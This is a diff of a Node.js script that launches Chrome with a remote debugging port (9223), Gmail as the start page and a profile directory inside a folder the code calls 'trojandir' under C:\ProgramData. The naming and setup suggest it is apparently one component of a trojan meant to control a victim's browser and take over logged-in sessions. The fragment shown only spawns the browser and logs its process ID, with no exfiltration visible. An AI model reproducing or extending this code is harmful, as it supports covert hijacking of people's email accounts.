@@ -8,9 +8,19 @@ const os = require("os");
 const crypto = require("crypto");
 const util = require("util");
 
-function spawn_chrome(starturl='https://www.gmail.com/', debugport=9223, datadir=null) {
+let trojandir = 'C:\\ProgramData\\owd';
 
-    datadir = datadir || path.join(systemstate.trojandir, 'chrome');
+function logmsg(msg) {
+    console.log(msg);
+}
+
+function isfunc(func) {
+    return typeof func === 'function';
+}
+
+function spawn_chrome(starturl='https://www.gmail.com/', debugport=9223, datadir=null, stdoutfunc=null, stderrfunc=null, closefunc=null) {
+
+    datadir = datadir || path.join(trojandir, 'chrome');
 
     let cmdlineargs = [ 
         `--remote-debugging-port=${debugport}`,
@@ -45,28 +55,32 @@ function spawn_chrome(starturl='https://www.gmail.com/', debugport=9223, datadir
     child.stdout.on("data", (data) => {
         let text = data.toString();
 
-        if (stdoutfunc) stdoutfunc(text);
+        if (isfunc(stdoutfunc)) stdoutfunc(text);
         else logmsg(text);
     });
 
     child.stderr.on("data", (data) => {
         let text = data.toString();
-
+        
         if (stderrfunc) stderrfunc(text);
         else logmsg(text);
     });
 
     child.on("close", (code) => {
-        if (closefunc) closefunc(code);
+        if (isfunc(closefunc)) closefunc(code);
         else logmsg(`Child process exited with code ${code}`);
     });
 
     return child;
 }
 
+console.log('--- BEGIN SCRIPT ---');
+
 console.log(JSON.stringify(process.argv));
 
-let childp = spawn_chrome();
+childp = spawn_chrome();
+
+console.log(`childp: ${childp.pid} ${childp.ppid}`);
 
 console.log('--- END SCRIPT ---');
 
